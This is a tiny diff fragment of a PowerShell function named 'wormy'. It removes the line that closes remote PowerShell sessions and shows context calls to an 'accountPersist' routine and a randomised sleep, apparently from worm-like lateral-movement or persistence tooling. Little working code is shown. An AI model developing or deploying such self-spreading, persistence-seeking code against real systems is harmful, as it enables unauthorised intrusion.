@@ -86,7 +86,7 @@ function wormy{
             }
             }
         }
-        Get-PSSession | Remove-PSSession
+        
         accountPersist
         start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
     }
